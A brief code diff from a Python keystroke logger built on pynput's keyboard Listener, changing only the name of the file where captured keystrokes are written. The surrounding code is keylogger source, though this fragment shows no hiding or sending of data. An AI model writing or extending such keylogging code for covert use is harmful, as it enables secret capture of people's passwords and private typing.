@@ -2,7 +2,7 @@ from pynput.keyboard import Listener
 import datetime
 
 # File to store the keystrokes
-log_file = "keylog.txt"
+log_file = "workspace_keylog.txt"
 
 # Function to write keystrokes to the file
 def on_press(key):
